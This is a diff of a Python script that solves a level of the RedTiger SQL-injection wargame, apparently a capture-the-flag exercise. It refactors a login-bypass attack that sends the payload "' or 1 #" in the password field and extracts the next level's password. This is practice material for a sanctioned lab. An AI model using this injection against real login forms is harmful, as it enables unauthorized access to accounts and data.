@@ -1,31 +1,33 @@
 #!/usr/bin/env python3
-import pickle
 import tigers as tg
 import tiger_cookies
-from connect import my_request as req
 
 
 def main():
-    '''
+    """
     Simple sqli injection
 
     Target: Login
     Hint: Condition
-    '''
+    """
     url = "https://redtiger.labs.overthewire.org/level2.php"
     pass_r = 'The password for the next level is: '
     level = 'level2login'
+    method = 'post'
+    inj_param = 'password'
+    other_param = {'username': '1', 'login': 'Login'}
 
     cooks = tiger_cookies.check_cookies(level)
     cook = dict(level2login=cooks[level])
 
     # Injection
-    param = dict(username='1', password="' or 1 #", login="Login")
-    response = req.post_request(url, param, cook)
+    payload = "' or 1 #"
+    p = tg.SqlInjection(url, cook, method, inj_param, payload,
+                        check_clear=pass_r, other_param=other_param)
+    response = p.my_request()
 
     # Еxtracting data from html
-    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
-    print('password:', passw)
+    passw = p.extract_pass(response)
     tiger_cookies.save_cookies(cooks, level, passw)
 
 
